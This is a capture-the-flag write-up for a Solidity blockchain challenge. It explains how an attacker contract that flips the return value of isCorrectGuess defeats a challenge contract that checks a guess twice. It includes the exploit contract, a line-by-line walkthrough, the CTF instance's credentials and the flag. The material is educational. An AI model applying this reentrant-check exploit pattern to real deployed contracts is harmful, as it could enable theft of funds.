}
```

we got a server which will manage instace for our challenge at by generating a secret from `get_ticket.py` 
`nc blockchain.bbctf.fluxus.co.in 5001`

![[instance_server.png]]
launch a instance and you will get 
``` python
uuid = "5759cffc-c638-451e-b41b-b8a15469ad49"
rpc_endpoint = "http://chal.bbctf.fluxus.co.in:8545/5759cffc-c638-451e-b41b-b8a15469ad49"
privatekey = "0xa9622978b37457dc8d5bb76996c8a166bc04fe8db0907dcba98ee7d7f4009f35"
youraddress = "0x5f20EdbCAa04777a636fF9564Ea9a96bA82af5A4"
setupcontract = "0x9C7fF8BCF007AA7041346f1c68C149b1469eA983"
```
## Ananlysis
- In `setup.sol` if you call `instance` it will return the address of the chall contract.
- `chall.sol` has wierd behaviour frist it will check wetather checker isCorrectGuess(_guess_) is `false` and to win next step it should be `true`.
-  `msg.sender` is address of sender so definatly we have to make a exploit contract.
- we have somthing called interface which we will get back to it later.
## Failed steps
## Research
I don't know much about solidity so i started learning how interface works.
[Contracts — Solidity 0.8.17 documentation (soliditylang.org)](https://docs.soliditylang.org/en/v0.8.17/contracts.html#interfaces)
https://www.youtube.com/watch?v=tbjyc-VQaQo
https://www.youtube.com/watch?v=hzH6fgKhSMg
Here is quick summary
- You can use contract address to directly talk with the contract insted of importing or adding its code to our contact.
- In this challange we have to specify the address of the interface contract with `msg.sender`.

## Exploit planning

we have to make a new contract which will call `makeAGuess` in `chall.sol` due to that  `isCorrectGuess`  in same contract should be called which initially returns `false` and in next call it should return `true`.

### exploit.sol
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;
import "./Chal.sol";
contract Attack{
    bool public retBool = true;
    Challenge public target;
    constructor (address _targetAddress) public{
        target = Challenge(_targetAddress);  
    }
    function isCorrectGuess(uint256) public returns(bool){
        retBool = !retBool;
        return retBool;
    }
    function guessIt(uint256 _guess) public {
        target.makeAGuess(_guess);
    }
}
```
ok! it overwelming let's see it line by line
```
import "./Chal.sol";
```
refrence with `setup.sol` we can get a instance of challange 

lets see `Attack` contract line by line.
```
Challenge public target;
bool public retBool = true;
```
here we are making a object of `Challenge` class so that we can call `makeAGuess`.
next a toggler to return bool value
```
 constructor (address _targetAddress) public{
        target = Challenge(_targetAddress);  
    }
```
`target = Challenge(_targetAddress);` will create a reference to the contract `Challenge`. Doing so allows you to call public functions of that contract. Now you can call `target.whateverFunctionItHas()` which will call the function on the contract at the address.
```
function isCorrectGuess(uint256) public returns(bool){
        retBool = !retBool;
        return retBool;
    }
```
this function when called frist time returns `false` and next time return `true`
```
function guessIt(uint256 _guess) public {
        target.makeAGuess(_guess);
    }
```
this function initaits our attack by calling `target.makeAGuess(_guess)`->`!checker.isCorrectGuess(_guess)` ->`checker.isCorrectGuess(_guess)`-> win is True now

## Exploit!!!

![[setting_rpc.png]]
Add ur PRC Url and ChainId
![[import_Account.png]]
import your account to metamask
![[got_account.png]]
now open Remix connect it with your wallet and account. intracct with deployed setup contract by passting its address to AtAddress input box with `setup_contract` address by opening `setup.sol`
now you will get address of challenge.
![[setup_contract.png]]
now add Challenge contract which you can have to intract.
![[chall_contract.png]]
now lets deploy attack contract by giving address which we got from instance in setup.
![[attack_contract.png]]
just give some value to guessIt and call get the flag by connecting to server and clicking on get flag with ur team_secret 
![[instance_server.png]]
FLAG:
	```flag{A1l_17s_r3quirED_is_a_1iI7lE_5oliDity}```
That's how we got second blood and only 2 teams solved it.i learned so much while solving this challenge but i got deep understanding after writing this writeup.
